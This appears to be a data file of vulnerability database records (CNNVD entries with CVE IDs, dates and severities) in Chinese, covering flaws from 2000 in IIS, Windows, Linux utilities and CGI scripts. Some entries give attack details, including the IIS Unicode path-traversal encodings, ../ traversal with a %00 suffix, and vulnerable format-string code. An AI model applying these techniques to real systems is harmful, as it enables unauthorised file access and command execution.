+Microsoft Windows NT/2000 NetBIOS名称冲突漏洞(MS00-047),CNNVD-200007-073,2000-07-27,2005-10-12,低危,授权问题,Microsoft Windows NT/2000是微软发布的非常流行的操作系统。 Windows系统中实现了NetBIOS名称服务(NBNS)协议用作Windows Internet名称服务(WINS)。根据设计，NBNS允许网络对等端帮助管理名称冲突，但这个协议是个未认证的协议，可能会被欺骗。攻击者可以滥用名称冲突机制，导致其他机器认为其名称发生了冲突，这样机器就无法在网络中注册名称，或放弃已注册的名称。 远程攻击者可以通过向NetBIOS名称服务发送NetBIOS名称冲突消息导致拒绝服务。,CVE-2000-0673
+Linux gpm文件删除漏洞,CNNVD-200007-071,2000-07-27,2005-10-20,低危,授权问题,Caldera Linux中的gpm存在漏洞。本地用户利用该漏洞删除任意文件或者进行服务拒绝。,CVE-2000-0667
+Microsoft Windows 2000可预测命名管道漏洞(MS00-053),CNNVD-200010-116,2000-08-01,2005-10-12,中危,授权问题,Microsoft Windows是美国微软（Microsoft）公司发布的一系列操作系统。 服务控制管理器(services.exe)是Windows 2000提供的管理工具，允许创建或修改系统服务。SCM会在每个服务开始的时候创建命名管道。但是，如果恶意程序能够在服务启动前预测并创建特定服务的命名管道的话，就可以扮演该服务的权限。这可能允许攻击者以特定用户或本地系统权限运行恶意程序。,CVE-2000-0737
+BSD mailx 8.1.1-10缓冲区溢出漏洞,CNNVD-200008-002,2000-08-08,2005-10-20,中危,授权问题,Linux系统中的mailx邮件命令（又称为Mail）存在缓冲区溢出漏洞。本地用户借助超长-c (carbon副本)参数提升特权。,CVE-2000-0545
+IRIX telnetd远程格式化串溢出漏洞,CNNVD-200010-090,2000-08-14,2005-05-02,超危,授权问题,telnet服务是流行的远程终端连接访问工具。 IRIX telnetd实现上存在格式化串溢出漏洞，远程攻击者可以利用此漏洞无需认证直接得到服务器的root用户权限。 IRIX telnetd 在收到IAC-SB-TELOPT_ENVIRON请求后会设置_RLT环境变量，当调用syslog()和sprintf()函数的时候，错误的将用户输入的数据作为格式化串的内容。这导致远程用户可以任意覆盖进程空间的内容，通过修改GOT入口参数等方法，攻击者可以远程获得root权限。,CVE-2000-0733
+"Microsoft IIS 5.0 ""Translate: f""头标记导致源码泄露漏洞(MS00-058)",CNNVD-200010-019,2000-08-14,2005-10-12,低危,授权问题,"IIS是Microsoft公司开发的流行的HTTP服务器程序，随同Windows操作系统捆绑发布。 IIS 5.0在处理某些带有特殊标记的HTTP请求时存在漏洞，远程攻击者可能利用此漏洞得到服务器上脚本的源码。 如果IIS 5.0接收到一个包含特殊头格式(Translate: f)的HTTP请求，同时URL末尾包含一个特殊字符(""/"")的话，IIS 会错误得调用脚本处理引擎，可能导致文件源码泄漏给远程用户。",CVE-2000-0778
+vqSoft vqServer 1.4.49远程长URL拒绝服务攻击漏洞,CNNVD-200010-028,2000-08-19,2005-05-02,高危,授权问题,"vqServer是一个小型的Web服务器程序，运行于Microsoft Windows系统下。 vqServer 1.4.49实现上存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞对服务器进行拒绝服务攻击。 远程攻击者如果给服务器发送长达65000个字节的""GET""请求，服务器将会停止响应。必需重启才能恢复提供正常服务。",CVE-2000-0766
+Microsoft FrontPage服务器扩展shtml.exe远程拒绝服务攻击漏洞,CNNVD-200010-045,2000-08-23,2005-10-20,低危,其他,FrontPage服务器扩展是Microsoft的一个产品，包括PWS和IIS版本，可以让网页设计人员方便的直接用FrontPage直接连接到PWS或者IIS上进行网页创作。shtml.exe是FrontPage服务器扩展的组件之一。 shtml.exe存在一个设计失误，远程攻击者可以利用此漏洞对服务器进行拒绝服务攻击。 FrontPage服务器扩展存在一个远程拒绝服务漏洞，可能远程关闭一个Web站点上的所有FrontPage操作。通过向shtml.exe提交一个包含DOS设备名(譬如con、aux、prn等)的链接请求，FrontPage 服务器扩展会挂起，不再响应后续的请求。为了恢复正常工作，必须重新启动IIS或者重新启动机器。,CVE-2000-0709
+Microsoft FrontPage服务器扩展shtml.exe远程拒绝服务攻击漏洞,CNNVD-200010-008,2000-08-23,2005-10-20,低危,其他,FrontPage服务器扩展是Microsoft的一个产品，包括PWS和IIS版本，可以让网页设计人员方便的直接用FrontPage直接连接到PWS或者IIS上进行网页创作。shtml.exe是FrontPage服务器扩展的组件之一。 shtml.exe存在一个设计失误，远程攻击者可以利用此漏洞对服务器进行拒绝服务攻击。 FrontPage服务器扩展存在一个远程拒绝服务漏洞，可能远程关闭一个Web站点上的所有FrontPage操作。通过向shtml.exe提交一个包含DOS设备名(譬如con、aux、prn等)的链接请求，FrontPage 服务器扩展会挂起，不再响应后续的请求。为了恢复正常工作，必须重新启动IIS或者重新启动机器。,CVE-2000-0710
+Microsoft Windows 9x / NT 4.0 / 2000 NetBIOS缓冲腐败漏洞,CNNVD-200008-003,2000-08-29,2005-10-20,中危,授权问题,"用于Microsoft Windows 95,98,NT,和2000版本中CIFS Browser Protocol和NetBIOS之间存在相互影响，远程攻击者借助单播或者UDP播放数据包中受欺骗的Browse Frame Request修改动态NetBIOS名称缓存条目。",CVE-2000-1079
+Stalkerlab's Mailers cgimail.exe可获取服务器任意文件漏洞,CNNVD-200010-088,2000-08-30,2005-08-17,低危,授权问题,Mailers是Stalker Lab的一个WEBMAIL产品，其中包含了一个叫cgimail.exe的程序，用于把用户提交表单的内容转换为一个email。 cgimail.exe实现上存在输入验证漏洞，远程攻击者可能利用此漏洞获得服务器上的任意文件。 该程序未对从表单中提交上来的变量$To$、$Attach$、$File$内容进行检查，导致攻击者可以把服务器上的任意有权限访问的文件以附件的形式发送给自己。,CVE-2000-0726
+Nathan Purciful phpPhotoAlbum目录遍历漏洞,CNNVD-200011-033,2000-09-07,2005-10-20,低危,授权问题,"phpPhotoAlbum 0.9.9所带的explorer.php存在一个目录遍历漏洞。 如果提交的链接中""folder""变量包含""../""字符串，远程用户就可能获取任何文件(以Web Server运行身份)的内容，也可以浏览有访问权限的目录。 比phpPhotoAlbum 0.9.9更老的版本中的另外一个程序getalbum.php也存在同样的问题，有问题的变量是""album""。",CVE-2000-0872
+Microsoft Windows 2000静态图像服务特权提升漏洞(MS00-065),CNNVD-200011-030,2000-09-08,2005-10-12,中危,授权问题,Windows是微软公司开发的广为流行的操作系统。 Windows 2000中的静态图像服务存在一个未对缓冲区进行检查的漏洞，这使得本地用户可以以该服务的特权级别(默认是LocalSystem的权限)执行指令。 这是由于Windows 2000处理进程间消息的某种方法中有一个未经检查的缓冲区。因此，这个漏洞也可能存在于其它服务之中。默认情况下静态图像服务并未安装，但是当任何能输入图像的设备(比如扫描仪或数字摄像机等等)添加到系统中时，该服务会被自动安装。,CVE-2000-0851
+YABB远程文件泄露漏洞,CNNVD-200011-062,2000-09-12,2005-07-26,低危,授权问题,YaBB.pl是一个基于Web的公告牌脚本程序。 YaBB.pl它将公告牌中的文章存放在编号的文本文件中。编号的文件名是在调用YaBB.pl时通过变量num=<file>来指定的。在检索该文件之前，YaBB在<file>后面添加一个后缀.txt。 由于YaBB中的输入合法性检查错误，在<file>中可以指定相对路径。这包括../类型的路径。此外，<file>可以不是数字格式，而且.txt后缀可以通过在<file>后面添加%00来避免。通过在单个请求中使用上述的这些漏洞，恶意用户可以察看Web服务器可以存取的任何文件。,CVE-2000-0853
+Microsoft Windows 2000 telnet.exe NTLM认证信息泄露漏洞,CNNVD-200011-029,2000-09-14,2005-10-12,中危,授权问题,Microsoft Windows是美国微软（Microsoft）公司发布的一系列操作系统。 Windows 2000系统的telnet.exe远程连接工具在执行认证时存在漏洞，远程攻击者可能利用此漏洞获取系统相关的敏感信息。,CVE-2000-0834
+FreeBSD fts库缓冲区溢出漏洞,CNNVD-200009-001,2000-09-16,2005-05-02,高危,授权问题,FreeBSD fts库存在缓冲区溢出漏洞。通常本地用户借助周期性的程序修改任意文件。,CVE-1999-0761
+Linux系统LPRng远程格式化串溢出漏洞,CNNVD-200012-136,2000-09-25,2006-09-05,超危,授权问题,LPRng是Berkeley lpr打印工具的一种实现。 某些Linux系统附带的LPRng程序存在一个格式化串溢出漏洞，远程攻击者可以利用此漏洞通过溢出攻击在主机上以root用户权限执行任意指令。 LPRng编程实现中有一个函数use_syslog()，此函数把用户的输入未加检查就作为一个格式化串传给syslog()函数。远程攻击者可以通过输入一个恶意的格式化串来破坏程序执行流程。在测试中，这个漏洞可被攻击者利用来从远程在主机上以root用户的权限执行任意指令。 有问题的代码部分在： /LPRng-3.6.22/src/common/errormsg.c， use_syslog() --- static void use_syslog(int kind， char *msg) ... # ifdef HAVE_OPENLOG /* use the openlog facility */ openlog(Name， LOG_PID | LOG_NOWAIT， SYSLOG_FACILITY ); syslog(kind， msg); closelog(); # else (void) syslog(SYSLOG_FACILITY | kind， msg); # endif /* HAVE_OPENLOG */ ...,CVE-2000-0917
+HP Node Manager SNMP远程拒绝服务漏洞,CNNVD-200012-004,2000-09-26,2005-10-12,低危,授权问题,HP OpenView网络节点管理器(OV NNM)是HP公司开发和维护的网络管理系统软件，具有强大的网络节点管理功能。 HP Openview Node Manager的SNMP服务实现上存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞在服务器上执行任意指令或导致拒绝服务。 HP Openview Node Manager的发行版中默认带有OverView5 CGI接口。由于存在一个未经检查的缓冲区，HP Openview Node Manager可能受到攻击。通过Overview5 CGI接口给Web服务(默认是80端口)发送一个特殊构造的包含136字节长数据的参数字段的GET请求，可以使SNMP服务崩溃。成功地利用这个漏洞可以执行任意的代码，这取决于发送的数据内容。,CVE-2000-1058
+多家厂商lpr远程格式串溢出漏洞,CNNVD-200208-067,2000-09-27,2006-09-15,高危,授权问题,lpr工具用于安排打印任务提交打印任务。 多家厂商基于BSD的lpr工具实现上存在格式化串溢出漏洞，远程攻击者可能利用此漏洞在服务器上执行任意指令。 lpr用到checkremote()函数，后者将用户输入内容组织成一个串，这个串会作为格式化串送往syslog，潜在地存在前段时间所披露的格式化串漏洞。 有问题的代码在lpr/lpd/printjob.c中： if ((s = checkremote())) syslog(LOG_WARNING， s);,CVE-2000-1208
+镜像文件创建漏洞,CNNVD-200009-002,2000-09-28,2005-05-02,低危,授权问题,Linux系统中的镜像文件存在漏洞。远程攻击者利用该漏洞创建本地目标目录的上一级文件。,CVE-2000-0354
+微软简体中文输入法(IME)状态判断错误安全漏洞(MS00-069),CNNVD-200012-085,2000-09-29,2005-10-12,中危,授权问题,"输入法编辑器(IME)使得用户可以使用标准的101键盘输入中文等双字节语言。 Windows 2000提供的简体中文输入法(IME)实现上存在漏洞，能物理接触计算机或通过终端服务访问的攻击者可以利用此漏洞直接获得主机的管理员权限。 如果一个IME在系统初始设置时被安装，缺省它也会出现在登录界面中。这时IME应当判断自身运行在什么环境中(例如，是本地系统还是用户环境)，然后提供不同的功能。然而，Windows 2000提供的简体中文输入法(IME)没有正确的检查当前运行环境，错误的将一些危险功能提供给了还处于登录界面的用户。因此，如果恶意用户可以通过物理键盘或者终端服务会话访问到受影响系统，它就可以绕过登录机制，获得系统的管理权限。 这个漏洞缺省只影响Windows 2000简体中文版。对于其他版本的Windows 2000(例如英文版)，只有默认设置时选择了安装简体中文IME， 才会受到影响。 NSFOCUS安全小组研究后发现，对于其他版本的Windows 2000(例如英文版)，如果是在默认安装之后安装了简体中文IME或者其他第三方IME，在系统默认登录界面不会受到影响，但是处在""工作站锁定""状态的系统仍然受此问题的影响。恶意用户可以轻易突破锁定状态，进入系统。 另见NSFOCUS紧急安全公告(Alert2000-ch-001)： http://www.nsfocus.net/index.php?act=advisory&do=view&adv_id=3",CVE-2000-0933
+Apache Rewrite模块任意文件泄露漏洞,CNNVD-200012-143,2000-09-29,2021-06-07,低危,其他,Apache是一款使用广泛的开放源代码WEB服务程序。mod_rewrite是Apache 1.2及之后版本捆绑的模块，用于将特殊URL映射到Web Server的文件系统中的绝对文件。 Apache的mod_rewrite在处理特殊的路径串时存在问题，远程攻击者可能利用此漏洞在主机读取任意文件。,CVE-2000-0913
+Red Hat Linux开发程序漏洞,CNNVD-200009-003,2000-09-30,2005-10-20,高危,授权问题,Red Hat Linux中用户模式包的用户帮助像根一样执行non-setuid程序，该软件不激活glibc中的安全措施，程序借助glibc中的格式串漏洞和LANG或者LC_ALL环境变量(CVE-2000-0844)从而被开发。,CVE-2000-1207
+Moreover.com cached_feed.cgi远程目录穿越漏洞,CNNVD-200012-104,2000-10-02,2005-10-20,低危,授权问题,"newsfeed是Moreover.com出品的一个CGI程序。 1.0版本的newsfeed存在一个安全问题，可能被利用来读取任意系统文件。 newsfeed的cached_feed.cgi文件在处理用户输入时没有过滤""..""，入侵者可以在路径中加上""..""访问上级目录甚至根目录的文件。2.0版本已经修复了该问题。",CVE-2000-0906
+Tmpwatch任意命执行漏洞,CNNVD-200010-001,2000-10-06,2005-05-02,低危,授权问题,Linux tmpwatch --fuser选项存在漏洞。本地用户通过创建文件名包含shell元字符的文件执行任意命令。,CVE-2000-0816
+Bytes Interactive网上商店程序远程文件泄露漏洞,CNNVD-200012-130,2000-10-08,2012-11-28,低危,授权问题,Bytes Interactive公司的Web Shopper是一个基于XML的网上购物应用程序。 Bytes Interactive Web Shopper购物卡程序(shopper.cgi) 2.0和较早的版本中存在目录遍历漏洞。远程攻击者利用该漏洞通过在‘newpage’参数上的‘..’攻击，读取任意文件。,CVE-2000-0922
+Extropia WebStore远程目录遍历文件泄露漏洞,CNNVD-200012-043,2000-10-09,2006-09-22,低危,授权问题,Extropia WebStore是一种用于网上购物的软件包。 eXtropia WebStore中的html_web_store.cgi和web_store.cgi CGI程序中存在目录遍历漏洞，远程攻击者可能利用此漏洞遍历服务器目录，读取任意有权限读取的文件。,CVE-2000-1005
+Microsoft IIS 4.0/5.0 Unicode解码错误可远程执行命令漏洞(MS00-078),CNNVD-200012-156,2000-10-11,2005-10-12,高危,授权问题,"IIS是Microsoft出品的一个广泛应用的Internet Web服务器软件，随Windows NT和Windows 2000捆绑发售。默认情况下IIS的某些目录是允许通过提交HTTP请求执行可执行文件的。 NSFOCUS安全小组发现IIS 4.0和IIS 5.0在Unicode字符解码的实现中存在一个安全漏洞，导致用户可以远程通过IIS执行任意命令。当IIS打开文件时，如果该文件名包含unicode字符，它会对其进行解码，如果用户提供一些特殊的编码，将导致IIS错误的打开或者执行某些Web根目录以外的文件和程序。 对于IIS 5.0/4.0中文版，当IIS收到的URL请求的文件名中包含一个特殊的编码例如""%c1%hh""或者""%c0%hh""，它会首先将其解码变成:0xc10xhh， 然后尝试打开这个文件，Windows系统认为0xc10xhh可能是Unicode编码，因此它会首先将其解码，如果 0x00< 0x40的话，采用的解码的格式与下面的格式类似： %c1%hh -> (0xc1 - 0xc0) * 0x40 + 0xhh %c0%hh -> (0xc0 - 0xc0) * 0x40 + 0xhh 因此，利用这种编码，我们可以构造很多字符，例如: %c1%1c -> (0xc1 - 0xc0) * 0x40 + 0x1c = 0x5c = '/' %c0%2f -> (0xc0 - 0xc0) * 0x40 + 0x2f = 0x2f = '\' 攻击者可以利用这个漏洞来绕过IIS的路径检查，去执行或者打开任意的文件。 Rain Forest Puppy <rfp@WIRETRIP.NET>测试发现对于英文版的IIS 4.0/5.0，此问题同样存在，只是编码格式略有不同，变成""%c0%af""或者""%c1%9c""。",CVE-2000-0884
+Microsoft Windows 9x共享密码校验漏洞(MS00-072),CNNVD-200012-165,2000-10-11,2005-10-12,低危,授权问题,Windows 9x系统提供的文件和打印共享服务可以设置口令保护，以避免非法用户的访问。然而微软NETBIOS协议的口令校验机制存在一个严重漏洞，使得这种保护形同虚设。 服务端在对客户端的口令进行校验时是以客户端发送的长度数据为依据的。因此，客户端在发送口令认证数据包时可以设置长度域为1， 同时发送一个字节的明文口令给服务端。服务端就会将客户端发来口令与服务端保存的共享口令的第一个字节进行明文比较，如果匹配就认为通过了验证。因此，攻击者仅仅需要猜测共享口令的第一个字节即可。 Microsoft Windows 9x 的远程管理也是采用的共享密码认证方式，所以也受此漏洞影响。,CVE-2000-0979
+Anaconda Foundation Directory远程目录遍历漏洞,CNNVD-200012-116,2000-10-13,2006-08-16,中危,授权问题,Anaconda Foundation Directory是一个基于开放目录项目(www.dmoz.org)类似Yahoo的搜索引擎。 Anaconda Foundation Directory存在漏洞，远程攻击者可以遍历目标主机的文件系统，获取服务器上的目录和文件内容。 脚本'apexec.pl'的'template'变量没有检查用户输入的数据，远程攻击者在请求的url里使用'../'技术和在文件扩展名后加null字节加'.html'就可以遍历目录访问任意文件。,CVE-2000-0975
+Apache HTTP Server 安全漏洞,CNNVD-200010-002,2000-10-13,2021-08-12,低危,其他,"Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点。 Apache 1.3.9,1.3.11和1.3.12版本的mod_vhost_alias虚拟主机模块存在安全漏洞。如果cgi-bin目录在文档根下，远程攻击者利用该漏洞可以获取CGI程序的源代码。",CVE-2000-1204
+Nachuatec服务拒绝漏洞,CNNVD-200010-003,2000-10-14,2005-10-20,低危,授权问题,Nachuatec D435和D445打印机存在漏洞。远程攻击者借助ICMP重定向风暴导致服务拒绝。,CVE-1999-1563
+RedHat Linux ping缓冲区溢出漏洞,CNNVD-200010-004,2000-10-18,2006-09-15,中危,授权问题,分配在Red Hat Linux 6.2至7J和其他操作系统中iputils 20001010之前版本的(1)outpack或者(2)buf多变的ping存在缓冲区溢出漏洞。本地用户利用该漏洞提升特权。,CVE-2000-1214
+Red Hat Linux iputils不释放特权漏洞,CNNVD-200010-005,2000-10-18,2006-09-15,中危,授权问题,分配在Red Hat Linux 6.2至7J和其他操作系统中iputils 20001010之前版本的ping在获得原始套接字后不释放特权，该漏洞增加本应在较低的特权中出现ping的漏洞暴露。,CVE-2000-1213
+IRIX xfs truncate()权限检查漏洞,CNNVD-200010-049,2000-10-20,2005-10-20,超危,授权问题,IRIX 6.x的truncate函数不正确检查xfs文件系统中的文件权限，本地用户可以利用该漏洞删除任意文件的内容。,CVE-2000-0798
+Microsoft Internet Explorer 安全漏洞,CNNVD-200010-136,2000-10-20,2021-07-26,低危,其他,Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Microsoft Internet Explorer存在安全漏洞。Internet Explorer 4.x版本和5.x版本中调用脚本的ActiveX控件渲染任意文件类型而不是HTML，攻击者可以读取任意命令，也称为Scriptlet Rendering漏洞。,CVE-2000-0767
+Worm HTTP服务拒绝漏洞,CNNVD-200010-109,2000-10-20,2005-08-17,低危,授权问题,Worm HTTP服务器存在漏洞。远程攻击者可以借助超长URL导致服务拒绝。,CVE-2000-0732
+微软IIS跨站脚本攻击.shtml漏洞,CNNVD-200010-017,2000-10-20,2005-10-20,中危,跨站脚本,IIS 4.0和5.0版本存在一些漏洞，没有正确防止跨站脚本攻击（CSS）。恶意web网站操作员可以利用该漏洞在信任网站连接中嵌入脚本，这些脚本是由客户端错误信息未经引用而返回的，然后客户端就可以像信任网站一样在相同环境中执行这些脚本。该漏洞也称为“IIS Cross-Site Scripting”漏洞。,CVE-2000-0746
+Netscape Communicator创建ServerSocket工程漏洞,CNNVD-200010-071,2000-10-20,2005-08-17,低危,授权问题,Netscape Communicator不正确保护包含由不可信实体创建的ServerSocket工程。远程攻击者可以借助恶意applet在受害者系统上创建服务器，正如Brown Orifice。,CVE-2000-0711
+Gnome Updater任意RPM安装漏洞,CNNVD-200010-068,2000-10-20,2005-10-20,中危,其他,Helix GNOME Updater helix-update 0.5及其之前版本存在漏洞。本地用户可以通过在根目录开始安装包前创建/tmp/helix-install安装目录。,CVE-2000-0722
+Becky! Internet邮件头缓冲区溢出漏洞,CNNVD-200010-096,2000-10-20,2005-10-20,低危,授权问题,Becky! Internet Mail客户端1.26.03及其早期版本存在漏洞。远程攻击者可以借助超长内容类型：当用户回复消息时产生的MIME头，导致服务拒绝。,CVE-2000-0735
+mopd执行任意文件漏洞,CNNVD-200010-067,2000-10-20,2005-05-02,高危,授权问题,mopd(Maintenance Operations Protocol装载守护守护程序)存在漏洞。远程攻击者可以借助超长文件名执行任意命令。,CVE-2000-0750
+GoodTech FTP server拒绝服务漏洞,CNNVD-200010-030,2000-10-20,2005-08-17,低危,授权问题,GoodTech FTP server存在漏洞。远程攻击者可以借助大量RNTO命令导致服务拒绝。,CVE-2000-0717
+ntop缓冲区溢出漏洞,CNNVD-200010-076,2000-10-20,2005-05-02,超危,授权问题,web模式下运行的ntop存在缓冲区溢出漏洞。远程攻击者可以利用该漏洞执行任意代码。,CVE-2000-0706
+xlockmore和xlockf格式化字符串漏洞,CNNVD-200010-075,2000-10-20,2005-05-02,高危,授权问题,xlockmore和xlockf不能正确清除用户注入格式字符串。本地用户可以借助-d选项提升根目录特权。,CVE-2000-0763
+Aptis Software TotalBill远程命令执行漏洞,CNNVD-200010-100,2000-10-20,2005-10-20,超危,授权问题,Aptis Totalbill中的系统生成服务不执行认证，远程攻击者可以通过连接到服务以及制定被执行的命令来提升根特权。,CVE-2000-0757
+HP-UX bdf/df缓冲区溢出漏洞,CNNVD-200010-110,2000-10-20,2005-10-20,高危,授权问题,HP-UX 11.00版本中bdf程序存在缓冲区溢出漏洞。本地用户可以借助超长-t选项来提升根特权。,CVE-2000-0801
+CGI Script Center Account Manager LITE / PRO管理员密码变更漏洞,CNNVD-200010-026,2000-10-20,2005-10-20,高危,授权问题,Account Manager LITE不正确认证修改管理员密码的尝试，远程攻击者可以通过直接调用setpasswd参数的amadmin.pl脚本获取Account Manager的权限。,CVE-2000-0689
+IRIX缓冲区溢出漏洞,CNNVD-200010-117,2000-10-20,2005-05-02,高危,授权问题,IRIX 6.2版本和6.3版本中lpstat存在缓冲区溢出漏洞。本地用户可以借助超长-n选项来提升根特权。,CVE-2000-0795
+BEA WebLogic源代码泄露漏洞,CNNVD-200010-032,2000-10-20,2007-06-19,低危,授权问题,BEA WebLogic 5.1.x存在漏洞。远程攻击者可以通过调用FileServlet的URL插入/ConsoleHelp/读取解析页面的源代码。,CVE-2000-0682
+MDaemon WorldClient邮件客户端漏洞,CNNVD-200010-083,2000-10-20,2005-05-02,低危,授权问题,MDaemon 2.8版本WorldClient邮件客户端在用户点击URL时包含提交者HTTP字段请求会话ID。访问web站点可以利用该漏洞劫持会话ID并读取用户邮件。,CVE-2000-0716
+Microsoft Money密码泄漏漏洞,CNNVD-200010-078,2000-10-20,2005-10-12,高危,授权问题,"Microsoft Money密码包含特征可以储存纯文本密码。攻击者可以通过物理途径访问系统获得密码，也称为""Money Password""漏洞。",CVE-2000-0777
+Red Hat Linux DiskCheck diskcheck.pl任意文件创建或覆盖漏洞,CNNVD-200010-098,2000-10-20,2005-10-20,高危,后置链接,Red Hat Linux中DiskCheck脚本diskcheck.pl存在漏洞。本地用户可以借助符号连接攻击来创建或覆盖任意文件。,CVE-2000-0715
+Microsoft Word任意命令执行漏洞,CNNVD-200010-126,2000-10-20,2005-05-02,高危,授权问题,Microsoft Word中Mail Merge工具在Access数据库执行Visual Basic (VBA)脚本之前不提示用户，攻击者可以执行任意命令。,CVE-2000-0788
+HP-UX newgrp权限提升漏洞,CNNVD-200010-012,2000-10-20,2005-05-02,中危,授权问题,HP-UX 11.0的newgrp命令存在漏洞。本地用户可以利用该漏洞获取权限。,CVE-2000-0730
+Adobe Acrobat / Reader / Business Tools缓冲区溢出漏洞,CNNVD-200010-036,2000-10-20,2005-10-20,高危,授权问题,运行PDF文件的Adobe Acrobat 4.05，Reader，Business Tools，和Fill In产品存在缓冲区溢出漏洞。攻击者可以通过超长/Registry或/Ordering说明符执行任意命令。,CVE-2000-0713
+CGI脚本中心Auction Weaver目录遍历漏洞,CNNVD-200010-106,2000-10-20,2005-10-20,低危,授权问题,Auction Weaver CGI script 1.03版本及之前版本存在漏洞。远程攻击者可以借助catdir参数的..（点 点）攻击来读取任意文件。,CVE-2000-0687
+Linux Intrusion Detection System (LIDS)权限许可和访问控制漏洞,CNNVD-200010-091,2000-10-20,2005-05-02,中危,授权问题,Linux Intrusion Detection System (LIDS)0.9.7版本存在漏洞。本地用户可以在LIDS失效时借助security=0启动选项提升根目录特权。,CVE-2000-0712
+Minnesota大学(UMN) gopherd任意命令执行漏洞,CNNVD-200010-131,2000-10-20,2005-05-02,高危,授权问题,Minnesota大学(UMN) gopherd 2.x版本存在缓冲区溢出漏洞。远程攻击者可以借助含超长票据值的DES密钥生成请求(GDESkey)来执行任意命令。,CVE-2000-0743
+Microsoft Office 2000 HTML解释器命令执行漏洞,CNNVD-200010-043,2000-10-20,2005-10-12,中危,授权问题,Microsoft Office 2000的HTML解释器存在缓冲区溢出漏洞。攻击者可以借助超长嵌入式对象标签执行任意命令，也称为“Microsoft Office HTML Object Tag”漏洞。,CVE-2000-0765
+NortonAntivirus Novell客户端防毒自动保护失效漏洞,CNNVD-200010-059,2000-10-20,2005-10-20,高危,授权问题,Novell Netware客户端Norton AntiVirus 5.00.01C版本在第一用户登出系统后不能正确重启自动保护服务。,CVE-2000-0793
+Netwin Netauth任意文件读取漏洞,CNNVD-200010-120,2000-10-20,2005-05-02,低危,授权问题,Netwin Netauth 4.2e版本及之前版本中netauth.cgi程序存在漏洞。远程攻击者可以借助..（点 点）攻击来读取任意文件。,CVE-2000-0782
+FlagShip安装许可漏洞,CNNVD-200010-057,2000-10-20,2005-10-20,中危,授权问题,"FlagShip包的FSserial, FlagShip_c, 和FlagShip_p程序安装时全域可写。本地用户可以利用该漏洞用特洛伊木马代替之。",CVE-2000-0721
+FreeBSD Linux binary兼容模式权限提升漏洞,CNNVD-200010-033,2000-10-20,2005-05-02,高危,授权问题,FreeBSD 3.x到5.x版本的Linux binary兼容模式存在缓冲区溢出漏洞。本地用户可以借助linux shadow文件系统的超长文件名获取根权限。,CVE-2000-0749
+MandrakeUpdate RMP文件修改漏洞,CNNVD-200010-103,2000-10-20,2005-05-02,低危,授权问题,MandrakeUpdate中的竞争条件存在漏洞。本地用户可以在文件安装之前在/tmp目录中修改RPM文件。,CVE-2000-0718
+RapidStream执行未授权远程命令漏洞,CNNVD-200010-070,2000-10-20,2005-10-20,超危,授权问题,"Rapidstream 2.1 Beta VPN应用sshd程序具有空密码硬空格字符""rsadmin""账户。远程攻击者可以借助ssh执行任意命令。",CVE-2000-0784
+计算机联合ARCserveIT ClientAgent暂时文件漏洞,CNNVD-200010-099,2000-10-20,2005-05-13,高危,授权问题,ARCServeIT Client Agent 6.62版本中uagentsetup不能正确检查移动到agent.cfg配置文件的暂时文件的存在或所有权，本地用户可以通过在暂时文件被移动之前修改它来执行任意命令。,CVE-2000-0781
+Eeye IRIS缓冲区溢出漏洞,CNNVD-200010-112,2000-10-20,2005-10-20,中危,授权问题,eEye IRIS 1.01 beta版本存在漏洞。远程攻击者可以借助大量UDP连接来导致服务拒绝。,CVE-2000-0734
+CVS Checkin.prog二进制执行漏洞,CNNVD-200010-046,2000-10-20,2005-10-20,高危,授权问题,CVS 1.10.8 server不正确限制用户创建任意Checkin.prog或Update.prog程序，远程CVS委托可以利用该漏洞修改或创建名为Checkin.prog或Update.prog的特洛伊木马程序，然后执行CVS委托操作。,CVE-2000-0680
+多厂商mgetty符号链接遍历漏洞,CNNVD-200010-029,2000-10-20,2005-10-20,低危,授权问题,mgetty数据包的faxrunq和faxrunqd存在漏洞。本地用户可以借助符号链接攻击创建或修改任意文件，该漏洞会创建/var/spool/fax/outgoing/.last_run到目标文件的符号链接。,CVE-2000-0691
+Red Hat Linux umb-scheme全域可读漏洞,CNNVD-200010-011,2000-10-20,2005-10-20,高危,配置错误,Red Hat Linux安装umb-scheme 3.2-11时带有全域可读权限的文件。,CVE-2000-0714
+GWScripts News Publisher news.cgi新作者添加漏洞,CNNVD-200010-097,2000-10-20,2006-10-06,中危,授权问题,GWScripts News Publisher中news.cgi不能正确鉴定添加作者到作者索引的请求，远程攻击者可以通过直接邮递HTTP请求到带有addAuthor参数的new.cgi程序，并且设置news.cgi程序的Referer来添加新作者。,CVE-2000-0720
+HP-UX (S008net.init) net.init rc文件覆盖漏洞,CNNVD-200010-020,2000-10-20,2005-05-02,低危,授权问题,HP-UX 11.00 (S008net.init)的net.init rc脚本存在漏洞。本地用户可以借助从/tmp/stcp.conf指向目标文件的符号链接攻击覆盖任意文件。,CVE-2000-0702
+Checkpoint Firewall-1漏洞,CNNVD-200010-094,2000-10-20,2006-01-04,高危,授权问题,RSH/REXEC设置有效的Checkpoint Firewall-1存在漏洞。远程攻击者可以借助畸形连接请求绕过访问限制连接RSH/REXEC客户端。,CVE-2000-0779
+BEA WebLogic源代码读取漏洞,CNNVD-200010-104,2000-10-20,2007-06-18,中危,授权问题,BEA WebLogic 5.1.x版本存在漏洞。远程攻击者可以通过将/*.shtml/插入到URL中来读取解析页面的源代码，该漏洞调用SSIServlet。,CVE-2000-0683
+mopd (Maintenance Operations Protocol loader daemon)命令执行漏洞,CNNVD-200010-038,2000-10-20,2005-05-02,高危,授权问题,mopd (Maintenance Operations Protocol loader daemon)不正确清除user-injected格式化字符串，远程攻击者可以利用该漏洞执行任意命令。,CVE-2000-0751
+Netscape Communicator和Navigator文件泄露漏洞,CNNVD-200010-022,2000-10-20,2005-10-12,低危,授权问题,Netscape Communicator和Navigator 4.04到4.74版本存在漏洞。远程攻击者可以通过使用Java程序打开使用“file”，“http”，“https”，和“ftp”协议的URL连接读取任意文件，正如Brown Orifice。,CVE-2000-0676
+Conectiva Linux OpenLDAP logrotate脚本漏洞,CNNVD-200010-079,2000-10-20,2005-05-13,超危,授权问题,用于Conectiva Linux的OpenLDAP 1.2.11之前版本的logrotate脚本向核心日志守护程序（klogd）发送不正确信号并杀死之。,CVE-2000-0747
